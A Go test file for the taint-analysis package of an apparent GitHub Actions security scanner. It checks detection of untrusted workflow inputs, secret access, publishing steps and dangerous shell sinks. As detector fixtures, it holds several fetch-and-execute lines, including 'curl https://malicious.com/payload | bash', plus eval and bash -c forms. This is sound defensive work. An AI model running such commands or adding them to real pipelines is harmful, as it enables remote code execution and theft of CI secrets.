package taint

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/Vigilant-LLC/runner-guard/internal/parser"
)

// ---------------------------------------------------------------------------
// IsTainted
// ---------------------------------------------------------------------------

func TestIsTainted_Tier1Sources(t *testing.T) {
	tests := []struct {
		name    string
		expr    string
		sources []string
		want    bool
	}{
		{
			name:    "head_ref in expression",
			expr:    "${{ github.head_ref }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "PR title in expression",
			expr:    "${{ github.event.pull_request.title }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "PR body in expression",
			expr:    "${{ github.event.pull_request.body }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "issue body in expression",
			expr:    "${{ github.event.issue.body }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "comment body in expression",
			expr:    "${{ github.event.comment.body }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "review body in expression",
			expr:    "${{ github.event.review.body }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "review_comment body in expression",
			expr:    "${{ github.event.review_comment.body }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "discussion body in expression",
			expr:    "${{ github.event.discussion.body }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "discussion title in expression",
			expr:    "${{ github.event.discussion.title }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "ref_name in expression",
			expr:    "${{ github.ref_name }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "github.ref in expression",
			expr:    "${{ github.ref }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "PR head sha in expression",
			expr:    "${{ github.event.pull_request.head.sha }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "PR head ref in expression",
			expr:    "${{ github.event.pull_request.head.ref }}",
			sources: Tier1Sources,
			want:    true,
		},
		{
			name:    "safe expression - github.sha",
			expr:    "${{ github.sha }}",
			sources: Tier1Sources,
			want:    false,
		},
		{
			name:    "safe expression - github.repository",
			expr:    "${{ github.repository }}",
			sources: Tier1Sources,
			want:    false,
		},
		{
			name:    "safe expression - steps output",
			expr:    "${{ steps.build.outputs.version }}",
			sources: Tier1Sources,
			want:    false,
		},
		{
			name:    "empty expression",
			expr:    "",
			sources: Tier1Sources,
			want:    false,
		},
		{
			name:    "empty sources",
			expr:    "${{ github.head_ref }}",
			sources: []string{},
			want:    false,
		},
		{
			name:    "nil sources",
			expr:    "${{ github.head_ref }}",
			sources: nil,
			want:    false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsTainted(tt.expr, tt.sources)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestIsTainted_CaseInsensitive(t *testing.T) {
	// GitHub Actions expressions are case-insensitive in practice.
	assert.True(t, IsTainted("${{ GITHUB.HEAD_REF }}", Tier1Sources))
	assert.True(t, IsTainted("${{ GitHub.Event.Pull_Request.Title }}", Tier1Sources))
}

func TestIsTainted_Tier2Sources(t *testing.T) {
	assert.True(t, IsTainted("FORK_CODE_EXECUTION", Tier2Sources))
	assert.False(t, IsTainted("some_other_value", Tier2Sources))
}

func TestIsTainted_Tier3Sources(t *testing.T) {
	assert.True(t, IsTainted("AI_CONFIG_FROM_FORK", Tier3Sources))
	assert.False(t, IsTainted("regular_config", Tier3Sources))
}

func TestIsTainted_ExpressionWithExtraContent(t *testing.T) {
	// Expressions might have formatting or function calls wrapping sources.
	assert.True(t, IsTainted("${{ format('refs/heads/{0}', github.head_ref) }}", Tier1Sources))
	assert.True(t, IsTainted("${{ toJson(github.event.pull_request.body) }}", Tier1Sources))
}

// ---------------------------------------------------------------------------
// ExtractTaintedExpressions
// ---------------------------------------------------------------------------

func TestExtractTaintedExpressions_Basic(t *testing.T) {
	step := &parser.Step{
		Name: "Checkout PR",
		Expressions: []string{
			"${{ github.head_ref }}",
			"${{ github.sha }}",
			"${{ github.event.pull_request.title }}",
		},
	}

	result := ExtractTaintedExpressions(step, Tier1Sources)
	require.Len(t, result, 2)
	assert.Contains(t, result, "${{ github.head_ref }}")
	assert.Contains(t, result, "${{ github.event.pull_request.title }}")
}

func TestExtractTaintedExpressions_NoTainted(t *testing.T) {
	step := &parser.Step{
		Name: "Safe step",
		Expressions: []string{
			"${{ github.sha }}",
			"${{ github.repository }}",
			"${{ steps.build.outputs.result }}",
		},
	}

	result := ExtractTaintedExpressions(step, Tier1Sources)
	assert.Empty(t, result)
}

func TestExtractTaintedExpressions_EmptyExpressions(t *testing.T) {
	step := &parser.Step{
		Name:        "Empty step",
		Expressions: []string{},
	}

	result := ExtractTaintedExpressions(step, Tier1Sources)
	assert.Empty(t, result)
}

func TestExtractTaintedExpressions_NilStep(t *testing.T) {
	result := ExtractTaintedExpressions(nil, Tier1Sources)
	assert.Nil(t, result)
}

func TestExtractTaintedExpressions_AllTainted(t *testing.T) {
	step := &parser.Step{
		Name: "All tainted",
		Expressions: []string{
			"${{ github.head_ref }}",
			"${{ github.event.issue.body }}",
			"${{ github.event.comment.body }}",
		},
	}

	result := ExtractTaintedExpressions(step, Tier1Sources)
	require.Len(t, result, 3)
}

// ---------------------------------------------------------------------------
// HasDangerousSink
// ---------------------------------------------------------------------------

func TestHasDangerousSink_CurlPipeToBash(t *testing.T) {
	tests := []struct {
		name string
		run  string
		want bool
		desc string
	}{
		{
			name: "curl piped to bash",
			run:  "curl -sSL https://example.com/install.sh | bash",
			want: true,
			desc: "curl piped to shell",
		},
		{
			name: "curl piped to sh",
			run:  "curl -fsSL https://example.com/script.sh | sh",
			want: true,
			desc: "curl piped to shell",
		},
		{
			name: "curl piped to bash with flags",
			run:  "curl -sSfL https://example.com/install.sh | bash -s --",
			want: true,
			desc: "curl piped to shell",
		},
		{
			name: "wget piped to sh",
			run:  "wget -qO- https://example.com/install.sh | sh",
			want: true,
			desc: "wget piped to shell",
		},
		{
			name: "wget piped to bash",
			run:  "wget https://example.com/script.sh | bash",
			want: true,
			desc: "wget piped to shell",
		},
		{
			name: "eval with variable",
			run:  `eval $COMMAND`,
			want: true,
			desc: "eval with variable expansion",
		},
		{
			name: "bash -c with variable",
			run:  `bash -c "$CMD"`,
			want: true,
			desc: "bash -c with variable expansion",
		},
		{
			name: "safe curl to file",
			run:  "curl -sSL https://example.com/file.tar.gz -o file.tar.gz",
			want: false,
		},
		{
			name: "safe wget to file",
			run:  "wget https://example.com/file.tar.gz -O file.tar.gz",
			want: false,
		},
		{
			name: "empty run",
			run:  "",
			want: false,
		},
		{
			name: "normal shell command",
			run:  "echo hello && make build",
			want: false,
		},
		{
			name: "multiline with curl pipe",
			run: `set -e
npm install
curl https://malicious.com/payload | bash
echo "done"`,
			want: true,
			desc: "curl piped to shell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, desc := HasDangerousSink(tt.run)
			assert.Equal(t, tt.want, got)
			if tt.want {
				assert.Equal(t, tt.desc, desc)
			}
		})
	}
}

func TestHasDangerousSink_CaseInsensitive(t *testing.T) {
	// The patterns should match regardless of case.
	got, desc := HasDangerousSink("CURL https://example.com/script | BASH")
	assert.True(t, got)
	assert.Equal(t, "curl piped to shell", desc)
}

// ---------------------------------------------------------------------------
// IsEnvTaintPropagated
// ---------------------------------------------------------------------------

func TestIsEnvTaintPropagated_JobLevelEnv(t *testing.T) {
	job := &parser.Job{
		ID: "build",
		Env: map[string]string{
			"BRANCH": "${{ github.head_ref }}",
		},
		Steps: []*parser.Step{
			{
				Name: "Use branch",
				Run:  "echo $BRANCH",
			},
		},
	}

	result := IsEnvTaintPropagated(job)
	require.Len(t, result, 1)
	assert.Contains(t, result[0], "BRANCH")
	assert.Contains(t, result[0], "github.head_ref")
}

func TestIsEnvTaintPropagated_StepLevelEnv(t *testing.T) {
	job := &parser.Job{
		ID:  "build",
		Env: map[string]string{},
		Steps: []*parser.Step{
			{
				Name: "Use PR title",
				Env: map[string]string{
					"PR_TITLE": "${{ github.event.pull_request.title }}",
				},
				Run: "echo ${PR_TITLE}",
			},
		},
	}

	result := IsEnvTaintPropagated(job)
	require.Len(t, result, 1)
	assert.Contains(t, result[0], "PR_TITLE")
}

func TestIsEnvTaintPropagated_NoTaint(t *testing.T) {
	job := &parser.Job{
		ID: "build",
		Env: map[string]string{
			"VERSION": "1.0.0",
		},
		Steps: []*parser.Step{
			{
				Name: "Use version",
				Run:  "echo $VERSION",
			},
		},
	}

	result := IsEnvTaintPropagated(job)
	assert.Empty(t, result)
}

func TestIsEnvTaintPropagated_TaintedEnvNotUsedInRun(t *testing.T) {
	job := &parser.Job{
		ID: "build",
		Env: map[string]string{
			"BRANCH": "${{ github.head_ref }}",
		},
		Steps: []*parser.Step{
			{
				Name: "Unrelated step",
				Run:  "echo hello world",
			},
		},
	}

	result := IsEnvTaintPropagated(job)
	assert.Empty(t, result)
}

func TestIsEnvTaintPropagated_BracedEnvVar(t *testing.T) {
	job := &parser.Job{
		ID: "test",
		Env: map[string]string{
			"COMMENT": "${{ github.event.comment.body }}",
		},
		Steps: []*parser.Step{
			{
				Name: "Process comment",
				Run:  `echo "${COMMENT}" | process-input`,
			},
		},
	}

	result := IsEnvTaintPropagated(job)
	require.Len(t, result, 1)
	assert.Contains(t, result[0], "COMMENT")
}

func TestIsEnvTaintPropagated_NilJob(t *testing.T) {
	result := IsEnvTaintPropagated(nil)
	assert.Nil(t, result)
}

func TestIsEnvTaintPropagated_NoSteps(t *testing.T) {
	job := &parser.Job{
		ID: "empty",
		Env: map[string]string{
			"BRANCH": "${{ github.head_ref }}",
		},
		Steps: nil,
	}

	result := IsEnvTaintPropagated(job)
	assert.Empty(t, result)
}

func TestIsEnvTaintPropagated_DoesNotFalsePositiveOnExpressions(t *testing.T) {
	// If the run block contains ${{ env.BRANCH }} (GitHub expression syntax),
	// that should NOT match the $BRANCH env var pattern, because the ${{ }}
	// block is stripped first.
	job := &parser.Job{
		ID: "test",
		Env: map[string]string{
			"BRANCH": "${{ github.head_ref }}",
		},
		Steps: []*parser.Step{
			{
				Name: "Expression only",
				Run:  "echo ${{ env.BRANCH }}",
			},
		},
	}

	result := IsEnvTaintPropagated(job)
	// ${{ env.BRANCH }} is stripped, so no shell env var reference remains.
	assert.Empty(t, result)
}

func TestIsEnvTaintPropagated_MultipleSteps(t *testing.T) {
	job := &parser.Job{
		ID: "deploy",
		Env: map[string]string{
			"REF": "${{ github.ref_name }}",
		},
		Steps: []*parser.Step{
			{
				Name: "Safe step",
				Run:  "echo hello",
			},
			{
				Name: "Vulnerable step",
				Run:  "git checkout $REF",
			},
		},
	}

	result := IsEnvTaintPropagated(job)
	require.Len(t, result, 1)
	assert.Contains(t, result[0], "REF")
	assert.Contains(t, result[0], "Vulnerable step")
}

// ---------------------------------------------------------------------------
// ContainsPublishingSink
// ---------------------------------------------------------------------------

func TestContainsPublishingSink_RunBlock(t *testing.T) {
	tests := []struct {
		name string
		run  string
		uses string
		want bool
	}{
		{
			name: "npm publish in run",
			run:  "npm publish --access public",
			uses: "",
			want: true,
		},
		{
			name: "docker push in run",
			run:  "docker push myrepo/myimage:latest",
			uses: "",
			want: true,
		},
		{
			name: "gh release in run",
			run:  "gh release create v1.0.0",
			uses: "",
			want: true,
		},
		{
			name: "vsce publish in run",
			run:  "vsce publish minor",
			uses: "",
			want: true,
		},
		{
			name: "cargo publish in run",
			run:  "cargo publish",
			uses: "",
			want: true,
		},
		{
			name: "gem push in run",
			run:  "gem push mypackage-1.0.0.gem",
			uses: "",
			want: true,
		},
		{
			name: "twine upload in run",
			run:  "twine upload dist/*",
			uses: "",
			want: true,
		},
		{
			name: "actions/create-release in uses",
			run:  "",
			uses: "actions/create-release@v1",
			want: true,
		},
		{
			name: "safe run block",
			run:  "npm install && npm test",
			uses: "",
			want: false,
		},
		{
			name: "safe uses",
			run:  "",
			uses: "actions/checkout@v4",
			want: false,
		},
		{
			name: "both empty",
			run:  "",
			uses: "",
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ContainsPublishingSink(tt.run, tt.uses)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestContainsPublishingSink_CaseInsensitive(t *testing.T) {
	assert.True(t, ContainsPublishingSink("NPM PUBLISH", ""))
	assert.True(t, ContainsPublishingSink("Docker Push myimage", ""))
}

// ---------------------------------------------------------------------------
// HasSecretAccess
// ---------------------------------------------------------------------------

func TestHasSecretAccess_StepExpressions(t *testing.T) {
	step := &parser.Step{
		Name: "Deploy",
		Expressions: []string{
			"${{ secrets.DEPLOY_TOKEN }}",
		},
	}
	job := &parser.Job{ID: "deploy"}

	assert.True(t, HasSecretAccess(step, job))
}

func TestHasSecretAccess_StepEnv(t *testing.T) {
	step := &parser.Step{
		Name: "Deploy",
		Env: map[string]string{
			"TOKEN": "${{ secrets.GITHUB_TOKEN }}",
		},
	}
	job := &parser.Job{ID: "deploy"}

	assert.True(t, HasSecretAccess(step, job))
}

func TestHasSecretAccess_JobEnv(t *testing.T) {
	step := &parser.Step{
		Name: "Build",
	}
	job := &parser.Job{
		ID: "build",
		Env: map[string]string{
			"NPM_TOKEN": "${{ secrets.NPM_TOKEN }}",
		},
	}

	assert.True(t, HasSecretAccess(step, job))
}

func TestHasSecretAccess_JobSecrets(t *testing.T) {
	step := &parser.Step{
		Name: "Build",
	}
	job := &parser.Job{
		ID: "build",
		Secrets: []parser.SecretRef{
			{Name: "DEPLOY_KEY", Expression: "${{ secrets.DEPLOY_KEY }}", LineNumber: 10},
		},
	}

	assert.True(t, HasSecretAccess(step, job))
}

func TestHasSecretAccess_NoSecrets(t *testing.T) {
	step := &parser.Step{
		Name: "Build",
		Expressions: []string{
			"${{ github.sha }}",
		},
		Env: map[string]string{
			"CI": "true",
		},
	}
	job := &parser.Job{
		ID: "build",
		Env: map[string]string{
			"GO_VERSION": "1.22",
		},
	}

	assert.False(t, HasSecretAccess(step, job))
}

func TestHasSecretAccess_NilStep(t *testing.T) {
	job := &parser.Job{
		ID: "build",
		Env: map[string]string{
			"TOKEN": "${{ secrets.TOKEN }}",
		},
	}

	assert.True(t, HasSecretAccess(nil, job))
}

func TestHasSecretAccess_NilJob(t *testing.T) {
	step := &parser.Step{
		Name: "Deploy",
		Expressions: []string{
			"${{ secrets.DEPLOY_TOKEN }}",
		},
	}

	assert.True(t, HasSecretAccess(step, nil))
}

func TestHasSecretAccess_BothNil(t *testing.T) {
	assert.False(t, HasSecretAccess(nil, nil))
}

// ---------------------------------------------------------------------------
// Package-level variables sanity checks
// ---------------------------------------------------------------------------

func TestShellSinkPatternsCompiled(t *testing.T) {
	require.NotEmpty(t, ShellSinkPatterns)
	for _, re := range ShellSinkPatterns {
		assert.NotNil(t, re)
	}
	// Verify it matches an expression in a run block.
	assert.True(t, ShellSinkPatterns[0].MatchString(`echo "${{ github.head_ref }}"`))
}

func TestDangerousShellPatternsCompiled(t *testing.T) {
	require.NotEmpty(t, DangerousShellPatterns)
	for _, re := range DangerousShellPatterns {
		assert.NotNil(t, re)
	}
}

func TestTier1SourcesComplete(t *testing.T) {
	// Ensure we have the expected number of Tier 1 sources.
	assert.Len(t, Tier1Sources, 14)

	// Verify some key sources are present.
	assert.Contains(t, Tier1Sources, "github.head_ref")
	assert.Contains(t, Tier1Sources, "github.event.pull_request.title")
	assert.Contains(t, Tier1Sources, "github.event.comment.body")
}

func TestPublishingSinksComplete(t *testing.T) {
	assert.Len(t, PublishingSinks, 8)
	assert.Contains(t, PublishingSinks, "npm publish")
	assert.Contains(t, PublishingSinks, "actions/create-release")
}
